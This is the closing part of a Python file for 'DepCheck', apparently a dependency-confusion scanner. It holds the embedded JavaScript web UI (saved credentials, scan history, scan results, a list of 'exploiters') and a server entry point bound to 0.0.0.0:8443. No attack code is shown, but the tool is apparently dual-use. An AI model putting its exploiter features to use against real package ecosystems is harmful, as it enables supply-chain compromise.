function deleteCred(key) {
  fetch('/api/creds/' + key, { method: 'DELETE' })
    .then(r => r.json())
    .then(() => { toast('Deleted: ' + key); loadCreds(); });
}

function clearAllCreds() {
  if (!confirm('Delete all saved credentials?')) return;
  fetch('/api/creds', { method: 'DELETE' })
    .then(r => r.json())
    .then(() => { toast('All credentials cleared'); loadCreds(); });
}

// ── History ──
function loadHistory() {
  fetch('/api/history')
    .then(r => r.json())
    .then(history => {
      const el = document.getElementById('historyList');
      if (!history.length) {
        el.innerHTML = '<div class="empty"><div class="icon">&#128269;</div><p>No scans yet</p></div>';
        return;
      }
      el.innerHTML = '<table class="pkg-table"><thead><tr><th>File</th><th>Ecosystem</th><th>Total</th><th>Vulnerable</th><th>Duration</th></tr></thead><tbody>' +
        history.map(h =>
          `<tr style="cursor:pointer" onclick="loadScanResult('${h.id}')">
            <td>${esc(h.file)}</td>
            <td>${h.ecosystem}</td>
            <td>${h.total}</td>
            <td>${h.vulnerable > 0 ? '<span class=\\'badge badge-red\\'>' + h.vulnerable + '</span>' : '<span class=\\'badge badge-green\\'>0</span>'}</td>
            <td>${h.duration}s</td>
          </tr>`
        ).join('') + '</tbody></table>';
    });
}

function loadScanResult(id) {
  fetch('/api/scan/' + id)
    .then(r => r.json())
    .then(data => {
      if (data.status === 'done') {
        currentScanId = id;
        currentResults = data;
        showResults(data);
        showPage('results');
      }
    });
}

// ── Init ──
function init() {
  // Load file types
  fetch('/api/info')
    .then(r => r.json())
    .then(info => {
      const sel = document.getElementById('fileType');
      info.parsers.forEach(p => {
        const opt = document.createElement('option');
        opt.value = p;
        opt.textContent = p;
        sel.appendChild(opt);
      });
      document.getElementById('parserCount').textContent = info.parsers.length;
      document.getElementById('exploiterList').textContent = info.exploiters.join(', ');
    });
  loadHistory();
  loadCreds();
}

init();
</script>
</body>
</html>
"""


# ─── Server Entry Point ────────────────────────────────────────────

def start_web(host="0.0.0.0", port=8443):
    """Start the DepCheck web server."""
    server = HTTPServer((host, port), WebHandler)
    print(f"""
{dc.C.R}  ____             ____ _               _
 |  _ \\  ___ _ __ / ___| |__   ___  ___| | __
 | | | |/ _ \\ '_ \\ |   | '_ \\ / _ \\/ __| |/ /
 | |_| |  __/ |_) | |___| | | |  __/ (__|   <
 |____/ \\___| .__/ \\____|_| |_|\\___|\\___|\\_\\_\\
            |_|
{dc.C.Y} Universal Dependency Confusion Scanner v{dc.VERSION}{dc.C.X}

{dc.C.G}  [+] Web UI running on: http://{host}:{port}{dc.C.X}
{dc.C.CN}  [*] Open in browser to start scanning{dc.C.X}
{dc.C.Y}  [*] Press Ctrl+C to stop{dc.C.X}
""")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{dc.C.Y}  [!] Server stopped.{dc.C.X}")
        server.server_close()


if __name__ == "__main__":
    start_web()
